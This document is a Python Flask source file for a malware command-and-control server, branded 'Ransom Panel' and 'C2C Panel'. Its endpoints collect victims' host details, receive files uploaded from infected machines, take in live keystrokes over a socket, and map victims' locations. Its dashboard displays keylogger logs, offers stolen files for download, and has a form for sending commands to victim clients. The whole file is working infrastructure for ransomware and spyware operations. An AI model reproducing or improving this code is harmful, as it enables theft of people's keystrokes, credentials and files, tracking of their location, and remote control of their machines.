# app.py - Complete fixed version
from flask import ( # type: ignore
    Flask,
    request,
    jsonify,
    render_template,
    render_template_string,
    url_for,
    redirect,
    send_from_directory,
    Response
)
from datetime import datetime, timedelta
import datetime as dt  # Rename the module import
import os
import json
import requests # type: ignore
import base64
import geoip2.database # type: ignore
import subprocess
import platform
import socket
from config import API_TOKEN

from flask_socketio import SocketIO, emit # type: ignore
import eventlet # type: ignore

eventlet.monkey_patch()
from pynput import keyboard # type: ignore

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Variabel untuk menyimpan proses VNC
# Paths
UPLOAD_DIR = "uploads"
LOG_DIR = "logs"
DEVICE_LOG = os.path.join(LOG_DIR, "device_info.json")
ACTIVITY_LOG = os.path.join(LOG_DIR, "activity.log")
GEOIP_DB_PATH = "GeoLite2-City.mmdb"
# Ensure directories exist
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)


# Custom Jinja2 filter for datetime formatting
@app.template_filter("datetimeformat")
def format_datetime(value, format="%Y-%m-%d %H:%M:%S"):
    if value is None:
        return ""
    try:
        if isinstance(value, str):
            dt = datetime.fromisoformat(value)
        else:
            dt = value
        return dt.strftime(format)
    except (ValueError, AttributeError):
        return str(value)


# Configuration
# UPLOAD_DIR = "uploads"
# LOG_DIR = "logs"
# DEVICE_LOG = os.path.join(LOG_DIR, "device_info.json")
# ACTIVITY_LOG = os.path.join(LOG_DIR, "activity.log")
# GEOIP_DB_PATH = "GeoLite2-City.mmdb"


def get_location_from_ip(ip):
    try:
        data = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
        loc = data.get("loc", "0,0")
        lat, lng = map(float, loc.split(","))
        location = ", ".join(
            filter(None, [data.get("city"), data.get("region"), data.get("country")])
        )
        return location, lat, lng
    except Exception:
        return "Unknown", 0.0, 0.0


def get_client_ip():
    # Cek header X-Forwarded-For dulu
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    return ip


@app.route("/location")
def location():
    ip = request.args.get("ip")
    if not ip:
        return jsonify({"error": "Missing IP parameter"}), 400

    location_str, _, _ = get_location_from_ip(
        ip
    )  # Ambil hanya location_str, abaikan lat/lng
    return jsonify(
        {
            "ip": ip,
            "location": location_str,
        }
    )


def log_activity(message):
    """Log activity to the activity log file"""
    try:
        with open(ACTIVITY_LOG, "a") as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except Exception as e:
        print(f"Failed to log activity: {str(e)}")


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ransom Panel</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Bungee&family=Cal+Sans&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
    <style>
        body {background-color: #000000 !important;}
        .navbar{background-color: #0a0a09;}
        .navbar-brand {font-family: "Bungee", sans-serif;font-weight: 400;font-style: normal;font-size: 33px;color: red;}
        .card {background-color: #161D2A;border: 2px solid red;}
        .card-title {color: red;font-family: "Bungee", sans-serif;font-weight: 400;font-style: normal;font-size: 23px;}
        .table-responsive { overflow-x: auto; }
       
        .accordion-button:not(.collapsed) { background-color: #f8f9fa; }
        .text-truncate { max-width: 200px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        #map {
    height: 300px;
    width: 100%;
    max-width: 500px;
    border: 4px solid blue;     /* ✅ Normal width */
    border-radius: 8px;         /* Opsional */
    box-shadow: 0 0 10px blue;  /* Opsional efek glow */
}
  table,
thead,
th {color: red;}

@keyframes blink {
  0%   { opacity: 1; }
  50%  { opacity: 0.3; }
  100% { opacity: 1; }
}
.blink {
  animation: blink 1s infinite;
}

    </style>
</head>
<body>
    <div class="container py-4">
        <div class="card shadow-sm mb-4">
        <nav class="navbar shadow-md">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">C2C Panel</a>
  </div>
</nav>

            <div class="card-body" style="background-color: #161D2A;">
            <div class="row map-box mb-4">
  <!-- Kolom Map -->
  <div class="col-md-6">
    <div id="map" class="border">
        </div>

  </div>

  <!-- Kolom Gambar -->
  <div class="col-md-6 d-flex justify-content-center align-items-center">
    <img src="data:image/png;base64,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" alt="Ransomware Illustration" class="img-fluid rounded shadow" style="max-height: 300px;">
  </div>
</div>

              
                <div class="table-responsive">
                    <table class="table table-dark table-striped table-hover table-bordered">
                        <thead class="table-dark">
                            <tr>
                                <th>#</th>
                                <th>Timestamp</th>
                                <th>Hostname</th>
                                <th>IP</th>
                                
                                <th>Location</th>
                                <th>OS</th>
                                <th>Public IP</th>
                                <th>User</th>
                                <th>Antivirus</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for info in device_info %}
                            <tr>
                                <td>{{ loop.index }}</td>
                                <td>{{ info.get('timestamp', '-') | datetimeformat }}</td>
                                <td style="color: cyan;">{{ info.get('hostname', '-') }}</td>
                                <td>{{ info.get('ip', '-') }}</td>
                                <td>{{ info.get('location', '-') }}</td>
                                <td>{{ info.get('os', '-') }}</td>
                                <td>{{ info.get('public_ip', '-') }}</td>
                                <td style="color: #00ff9d;">{{ info.get('user', '-') }}</td>
                                <td>{{ info.get('antivirus', '-') }}</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
            
        
        <div class="card shadow-sm">
    <div class="card-body">
        <h2 class="card-title mb-3">Target System</h2>

        <div class="accordion" id="filesAccordion">
  {% for host in unique_hosts %}
  <div class="accordion-item" style="background-color: #10151f; border: 1px solid grey;">
    <h2 class="accordion-header">
      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
              data-bs-target="#collapse{{ loop.index }}" aria-expanded="false"
              style="background-color: #161d2a; color: red;">
        {% if host in active_hosts %}
          <i class="bi bi-circle-fill text-success me-2 blink"></i>
        {% else %}
          <i class="bi bi-circle text-secondary me-2"></i>
        {% endif %}
        Host: {{ host }}
      </button>
    </h2>
    <div id="collapse{{ loop.index }}" class="accordion-collapse collapse">
      <div class="accordion-body p-0" style="background-color: #0e111a;">
        <ul class="list-group list-group-flush">
          {% for item in uploaded_files if item.folder == host %}
          <li class="list-group-item d-flex justify-content-between align-items-center" style="background-color: #0e111a; color: white;">
            <span><i class="bi bi-file-earmark-text me-1"></i> {{ item.filename }}</span>
            <div class="btn-group">
              <a class="btn btn-sm btn-outline-primary" href="/download/{{ item.folder }}/{{ item.filename }}?token={{ token }}">
                <i class="bi bi-download"></i>
              </a>
              {% if item.filename.endswith('.txt') or item.filename.endswith('.log') %}
              <a class="btn btn-sm btn-outline-info" href="/preview/{{ item.folder }}/{{ item.filename }}?token={{ token }}">
                <i class="bi bi-eye"></i>
              </a>
              {% endif %}
              <form method="post" action="/delete/{{ item.folder }}/{{ item.filename }}" onsubmit="return confirm('Delete this file?');">
                <input type="hidden" name="token" value="{{ token }}">
                <button class="btn btn-sm btn-outline-danger" type="submit">
                  <i class="bi bi-trash"></i>
                </button>
              </form>
            </div>
          </li>
          {% endfor %}
        </ul>
      </div>
    </div>
  </div>
  {% endfor %}
</div>





<div class="container mt-5">
  <!-- 🔐 Keylogger Logs (disederhanakan satu host saja) -->
  <div class="card shadow-sm mt-4">
    <div class="card-body">
      <h2 class="card-title mb-3" style="color: orange;">Keylogger Logs</h2>

      {% if keylogs_by_host %}
        {% set first_host = keylogs_by_host|dictsort|first %}
        <div class="mb-4">
          <h5 style="color: cyan;">{{ first_host[0] }}</h5>
          <textarea id="log-{{ first_host[0] }}"
                    class="form-control"
                    rows="12"
                    readonly
                    style="background-color: #000; color: #00FF00; font-family: monospace; white-space: pre-wrap; border: 2px solid red;">
{{ first_host[1] }}
          </textarea>
        </div>
      {% else %}
        <div class="alert alert-info">Belum ada log keylogger dari klien.</div>
      {% endif %}
    </div>
  </div>
</div>

       

<button onclick="locateUser()" class="btn btn-outline-warning btn-sm mt-2">Deteksi Lokasi Akurat</button>

<div class="card shadow-sm mt-4">
    <div class="card-body">
        <h2 class="card-title">Kirim Perintah ke Client</h2>
        <form method="POST" action="/send_command">
            <div class="mb-3">
                <label class="form-label">Client ID:</label>
                <input type="text" name="client_id" class="form-control" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Command (contoh: notepad.exe):</label>
                <input type="text" name="cmd" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-danger">Kirim Perintah</button>
        </form>

        <h3 class="mt-3">Command Aktif:</h3>
        <ul class="list-group">
            {% for cid, cmd in commands.items() %}
            <li class="list-group-item"><b>{{ cid }}</b>: {{ cmd }}</li>
            {% else %}
            <li class="list-group-item"><i>Belum ada perintah aktif</i></li>
            {% endfor %}
        </ul>
    </div>
</div>


    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
var map = L.map('map').setView([0, 0], 2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19,
   
}).addTo(map);
    

var iconBlue = new L.Icon({
  iconUrl: 'https://maps.google.com/mapfiles/ms/icons/blue-dot.png',
  iconSize: [32, 32],
  iconAnchor: [16, 32],
});

var firstPositioned = false;
var markers = {{ device_info | tojson | safe }};

markers.forEach(function(m) {
    if (m.latitude && m.longitude) {
        var marker = L.marker([m.latitude, m.longitude], { icon: iconBlue }).addTo(map);
        marker.bindPopup(`
            <strong>${m.hostname || 'Unknown'}</strong><br>
            ${m.location || 'Unknown'}<br>
            <small>${m.public_ip || ''}</small>
        `);

        if (!firstPositioned) {
            map.setView([m.latitude, m.longitude], 6);
            firstPositioned = true;
        }
    }
});
</script>


<script>
    async function getPublicIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;
           

            // Kirim IP ke server Flask untuk cari lokasi
            const locResponse = await fetch(`/location?ip=${ip}`);
            const locData = await locResponse.json();

            if (locData.location && locData.location !== "Unknown") {
                document.getElementById('location').textContent = 
                    `${locData.location}`;
            } else {
                document.getElementById('location').textContent = "Lokasi tidak ditemukan.";
            }
        } catch (error) {
            document.getElementById('status').textContent = "Gagal mendapatkan IP publik.";
            console.error(error);
        }
    }
    getPublicIP();
</script>




<script>
const socket = io("/");

socket.on("connect", () => {
  console.log("[SOCKET] Connected");
});

socket.on("update_log", (data) => {
  const textarea = document.getElementById("log-" + data.host);
  if (textarea) {
    textarea.value += data.log;
    textarea.scrollTop = textarea.scrollHeight;
  }
});
</script>


<script>
function locateUser() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            map.setView([lat, lng], 13);
            L.marker([lat, lng]).addTo(map)
                .bindPopup("Lokasi Anda (akurasi tinggi)").openPopup();

            // ✅ Kirim JSON dengan header yang BENAR
            fetch("/upload_geo", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json" // ← ini WAJIB
                },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lng
                })
            })
            .then(res => res.json())
            .then(data => console.log("Response server:", data))
            .catch(err => console.error("Error:", err));
        }, function(error) {
            alert("Gagal mendapatkan lokasi: " + error.message);
        });
    } else {
        alert("Browser tidak mendukung Geolocation.");
    }
}
</script>



</body>
</html>
"""


@app.route("/map")
def map_view():
    token = request.args.get("token")
    if token != API_TOKEN:
        return "Unauthorized", 403

    with open(DEVICE_LOG) as f:
        device_info = json.load(f)
    return render_template_string(HTML_TEMPLATE, device_info=device_info)


@app.route("/upload_info", methods=["POST"])
def upload_info():
    if request.headers.get("Authorization") != f"Bearer {API_TOKEN}":
        log_activity("Unauthorized /upload_info")
        return jsonify({"error": "Unauthorized"}), 401

    if not request.is_json:
        return jsonify({"error": "Expected JSON"}), 415

    try:
        data = request.get_json()
        data["timestamp"] = datetime.now().isoformat()

        required = ["hostname", "ip", "os", "user", "antivirus"]
        if any(k not in data for k in required):
            return jsonify({"error": "Missing required fields"}), 400

        data["public_ip"] = data.get("public_ip", request.remote_addr)

        if not data.get("location"):
            location, lat, lng = get_location_from_ip(data["public_ip"])
            data["location"] = location
            data["latitude"] = lat
            data["longitude"] = lng

        logs = []
        if os.path.exists(DEVICE_LOG):
            with open(DEVICE_LOG, "r") as f:
                try:
                    logs = json.load(f)
                except:
                    logs = []

        logs = [log for log in logs if log.get("hostname") != data["hostname"]]
        logs.append(data)

        with open(DEVICE_LOG, "w") as f:
            json.dump(logs, f, indent=2)

        log_activity(f"Device info saved for {data['hostname']}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        log_activity(f"Error in /upload_info: {e}")
        return jsonify({"error": "Internal error"}), 500


@app.route("/upload_file", methods=["POST"])
def upload_file():
    """Endpoint to receive uploaded files"""
    token = request.form.get("token")
    if token != API_TOKEN:
        log_activity("Unauthorized access attempt to /upload_file")
        return jsonify({"error": "Unauthorized"}), 401

    if "file" not in request.files:
        return jsonify({"error": "No file part in request"}), 400

    file = request.files["file"]
    hostname = request.form.get("hostname", "unknown").strip() or "unknown"

    if not file or file.filename == "":
        return jsonify({"error": "Empty filename"}), 400

    filename = os.path.basename(file.filename)
    if not filename:
        return jsonify({"error": "Invalid filename"}), 400

    date_folder = datetime.now().strftime("%Y-%m-%d")
    save_path = os.path.join(UPLOAD_DIR, hostname, date_folder)

    try:
        os.makedirs(save_path, exist_ok=True)
    except OSError as e:
        log_activity(f"Failed to create directory {save_path}: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500

    file_path = os.path.join(save_path, filename)
    try:
        file.save(file_path)
    except Exception as e:
        log_activity(f"Failed to save file {filename}: {str(e)}")
        return jsonify({"error": "Internal server error"}), 500

    log_activity(f"File received from {hostname}: {filename}")
    return (
        jsonify(
            {
                "status": "ok",
                "file": filename,
                "path": os.path.join(hostname, date_folder, filename),
            }
        ),
        200,
    )

commands = {}

@app.route("/admin", methods=["GET"])
def admin():
    token = request.args.get("token")
    if token != API_TOKEN:
        return "<h3 class='text-danger'>Unauthorized</h3>", 403

    device_info = []
    uploaded_files = {}
    keylogs_by_host = {}

    try:
        if os.path.exists(DEVICE_LOG):
            with open(DEVICE_LOG, "r") as f:
                device_info = json.load(f)
    except Exception as e:
        log_activity(f"Failed to load device info: {e}")

    try:
        for root, dirs, files in os.walk(UPLOAD_DIR):
            folder = os.path.relpath(root, UPLOAD_DIR)
            if files:
                uploaded_files[folder] = sorted(files)
                for f in files:
                    if f == "keystrokes.log":
                        full_path = os.path.join(root, f)
                        try:
                            with open(full_path, "r", encoding="utf-8") as log_f:
                                keylogs_by_host[folder] = log_f.read()[-2000:]
                        except Exception as e:
                            keylogs_by_host[folder] = f"[ERROR]: {e}"
    except Exception as e:
        log_activity(f"Failed to scan upload dir: {e}")

    all_uploaded_files = []
    for folder, files in uploaded_files.items():
        for filename in files:
            all_uploaded_files.append({"folder": folder, "filename": filename})

    unique_hosts = sorted(set(item["folder"] for item in all_uploaded_files))

    active_hosts = []
    now = datetime.now()
    for log in device_info:
        try:
            ts = datetime.fromisoformat(log.get("timestamp", ""))
            if now - ts < timedelta(minutes=5):
                active_hosts.append(log.get("hostname"))
        except Exception:
            continue

    return render_template_string(
        HTML_TEMPLATE,
        device_info=device_info,
        uploaded_files=all_uploaded_files,
        keylogs_by_host=keylogs_by_host,
        token=token,
        unique_hosts=unique_hosts,
        active_hosts=active_hosts,
        commands=commands,
    )


@app.route("/download/<path:folder>/<filename>", methods=["GET"])
def download_file(folder, filename):
    """Endpoint to download files"""
    token = request.args.get("token")
    if token != API_TOKEN:
        return "<h3 class='text-danger'>Unauthorized</h3>", 403

    folder_path = os.path.join(UPLOAD_DIR, folder)
    file_path = os.path.join(folder_path, filename)

    if not os.path.isfile(file_path):
        return "<h3 class='text-danger'>File not found</h3>", 404

    try:
        return send_from_directory(folder_path, filename, as_attachment=True)
    except Exception as e:
        log_activity(f"Failed to download file {filename}: {str(e)}")
        return "<h3 class='text-danger'>Internal server error</h3>", 500


@app.route("/keylog/<host>/<date>", methods=["GET"])
def get_keylog_by_date(host, date):
    token = request.args.get("token")
    if token != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403

    keylog_path = os.path.join(UPLOAD_DIR, host, date, "keystrokes.log")
    if not os.path.isfile(keylog_path):
        return jsonify({"log": "[No keylog found]"}), 404

    try:
        with open(keylog_path, "r", encoding="utf-8") as f:
            content = f.read()
        return jsonify({"log": content})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@socketio.on("keylog")
def handle_keylog(data):
    hostname = data.get("hostname")
    log = data.get("log")

    if not hostname or not log:
        return

    log_dir = os.path.join(UPLOAD_DIR, hostname)
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "keystrokes.log")

    if os.path.exists(log_path):
        age = datetime.now() - datetime.fromtimestamp(os.path.getmtime(log_path))
        if age.total_seconds() > 86400:
            os.remove(log_path)

    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(log)
    except Exception as e:
        print(f"[!] Failed to write keylog: {e}")

    emit("update_log", {"host": hostname, "log": log}, broadcast=True)


@app.route("/preview/<path:folder>/<filename>", methods=["GET"])
def preview_file(folder, filename):
    token = request.args.get("token")
    if token != API_TOKEN:
        return "Unauthorized", 403

    file_path = os.path.join(UPLOAD_DIR, folder, filename)
    if not os.path.exists(file_path):
        return "File not found", 404

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read(3000)  # batas atas agar tidak terlalu besar
        return f"<pre>{content}</pre>"
    except Exception as e:
        return f"<pre>Could not preview file: {e}</pre>"


@app.route("/delete/<path:folder>/<filename>", methods=["POST"])
def delete_file(folder, filename):
    token = request.form.get("token")
    if token != API_TOKEN:
        return "Unauthorized", 403

    file_path = os.path.join(UPLOAD_DIR, folder, filename)
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            return redirect(url_for("admin", token=token))  # <- redirect setelah hapus
        else:
            return "File not found", 404
    except Exception as e:
        return f"Failed to delete file: {e}", 500


@app.route("/upload_geo", methods=["POST"])
def upload_geo():
    if not request.is_json:
        return jsonify({"error": "Content-Type harus application/json"}), 400

    try:
        data = request.get_json()
        lat = data.get("latitude")
        lng = data.get("longitude")
        hostname = data.get("hostname", "unknown")

        if lat is None or lng is None:
            return jsonify({"error": "latitude dan longitude wajib"}), 400

        # Update data di device_info.json
        updated = False
        if os.path.exists(DEVICE_LOG):
            with open(DEVICE_LOG, "r") as f:
                try:
                    logs = json.load(f)
                except:
                    logs = []

            for entry in logs:
                if entry.get("hostname") == hostname:
                    entry["latitude"] = lat
                    entry["longitude"] = lng
                    updated = True

            if updated:
                with open(DEVICE_LOG, "w") as f:
                    json.dump(logs, f, indent=2)
                log_activity(f"Updated location for {hostname}: ({lat}, {lng})")
                return jsonify({"status": "updated"}), 200

        return jsonify({"status": "no matching hostname"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500







if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
